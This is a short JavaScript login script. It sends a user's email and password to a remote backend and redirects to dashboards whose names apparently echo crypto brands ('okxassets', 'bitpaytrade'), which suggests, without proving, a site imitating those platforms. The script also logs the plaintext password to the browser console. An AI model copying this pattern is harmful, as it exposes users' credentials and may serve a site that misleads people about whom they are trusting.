const email = document.getElementById("email");
const password = document.getElementById("password");
const button = document.getElementById("signInBtn");

const sendLoginEmail = async () => {
  const data = {
    email: email.value,
  };
  fetch("https://my-guy-efabackend.onrender.com/api/loginemailsand", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
    .then((response) => response.json())
    .then((response) => {
      console.log(response);
    })
    .catch((error) => {
      console.log(error);
    });
};

if (button)
  button.onclick = async (event) => {
    event.preventDefault();

    const data = {
      email: email.value,
      password: password.value,
    };

    console.log(data);
    button.innerHTML = "Loading...";

    fetch("https://my-guy-efa-back-end-beryl.vercel.app/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then(async (response) => {
        const result = await response.json();
        if (!response.ok) {
          throw new Error(result.message || "Login failed");
        }
        return result;
      })
      .then((response) => {
        localStorage.setItem("userId", response?._id);
        // console.log(response);
        const userId = localStorage?.getItem("userId");
        console.log("Local User Id", userId);
        if (response._id === "" || response._id === undefined) {
          alert("Please enter your valid credentials");
          button.innerHTML = "Sign In";
          // console.log("object");
          return;
        }
        if (response.message === "User have not been verified") {
          window.location = `https://bitpaytrade-dashboard.vercel.app/`;
          // console.log("object");
          return;
        } else {
          // console.log("object2");
          const userId = localStorage?.getItem("userId");
          //  console.log(userId)
          sendLoginEmail();
          window.location = "https://okxassets-dashboard.vercel.app/#/";
        }
      })
      .catch((error) => {
        console.log(error);
        alert(error.message || "Unable to log in. Please try again.");
        button.innerHTML = "Sign In";
      });
  };
